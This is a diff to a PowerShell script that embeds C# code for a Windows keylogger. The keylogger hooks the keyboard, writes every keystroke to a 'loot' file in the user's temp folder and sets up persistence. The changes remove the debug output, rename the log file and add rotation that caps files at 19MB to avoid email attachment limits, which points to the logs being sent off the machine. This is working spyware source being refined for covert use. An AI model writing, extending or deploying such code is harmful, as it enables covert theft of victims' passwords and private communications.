@@ -20,7 +20,6 @@ function Check-DotNetFramework {
 
     # .NET Framework 4.0 and later versions have a release value >= 379893
     if ($dotNetVersion -ge 379893) {
-		#Write-Host ".NET Version: $dotNetVersion"
         return $true
     }
     
@@ -29,15 +28,13 @@ function Check-DotNetFramework {
 
 function KeyLog {
 	if (Check-DotNetFramework) {
-		#Write-Host ".NET Framework is present."
 		ComplexKeyLog
 	} else {
-		#Write-Host ".NET Framework is not present."
 		SimpleKeyLog
 	}
 }
 
-function ComplexKeyLog($LogFile="$env:temp\$env:username.log") {
+function ComplexKeyLog($LogFile="$env:temp\$env:username.txt") {
 	$LootFile = New-Item -Path $LogFile -ItemType File -Force
 	$source = @"
 using System;
@@ -66,7 +63,10 @@ namespace KeyLogger {
 	private const int VK_DOWN = 0x28;
 	private const int VK_DELETE = 0x2E;
 
-    private static StreamWriter logFile;
+    public static StreamWriter logFile;
+    public static string logFileName;
+    public static string baseName;
+	public const long MaxFileSizeBytes = 19 * 1024 * 1024; // Maximum file size of 19MB to avoid file size attachment issues
 
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
@@ -117,9 +117,25 @@ namespace KeyLogger {
         return false;
     }
 
+	public static void RotateLogFileIfNeeded() {
+		FileInfo fileInfo = new FileInfo(logFileName);
+        if (fileInfo.Length >= MaxFileSizeBytes) {
+            logFile.Close();
+            string newLogFileName = Path.GetFileNameWithoutExtension(baseName) + "-" + 
+                                    DateTime.Now.ToString("yyyyMMddHHmmss") + 
+                                    Path.GetExtension(baseName);
+            logFileName = Path.Combine(Path.GetDirectoryName(baseName), newLogFileName);
+            logFile = File.AppendText(logFileName);
+            logFile.AutoFlush = true;
+        }
+	}
     public static void Main(string[] args) {
 	  if (args.Length > 0) {
-		string logFileName = args[0];
+	 	baseName = args[0];
+        logFileName = Path.GetFileNameWithoutExtension(baseName) + "-" + 
+                                    DateTime.Now.ToString("yyyyMMddHHmmss") + 
+                                    Path.GetExtension(baseName);
+        logFileName = Path.Combine(Path.GetDirectoryName(baseName), logFileName);
 	  	logFile = File.AppendText(logFileName);
       	logFile.AutoFlush = true;
 
@@ -127,7 +143,6 @@ namespace KeyLogger {
       	Application.Run();
       	UnhookWindowsHookEx(hookId);
 	} else {
-			Console.WriteLine("No log file path provided."); 
 		}
     }
 
@@ -140,6 +155,7 @@ namespace KeyLogger {
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
       if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+	  	RotateLogFileIfNeeded();
         int vkCode = Marshal.ReadInt32(lParam);
 
 		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
@@ -337,11 +353,11 @@ namespace KeyLogger {
 }
 "@
 Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
-$logFileName = "$env:temp\$env:username.log"
+$logFileName = "$env:temp\$env:username.txt"
 [KeyLogger.Program]::Main($logFileName);
 }
 
-function SimpleKeyLog($LogFile="$env:temp\$env:username.log") {
+function SimpleKeyLog($LogFile="$env:temp\$env:username.txt") {
 	$LootFile = New-Item -Path $LogFile -ItemType File -Force
 
 	$APIsigs = @"
@@ -466,6 +482,5 @@ Start-Job -ScriptBlock {
 	} -InitializationScript { 
 				$ProgressPreference = 'SilentlyContinue'; 
 				} | Out-Null
-
 CreatePersistance -Type $Type
 KeyLog
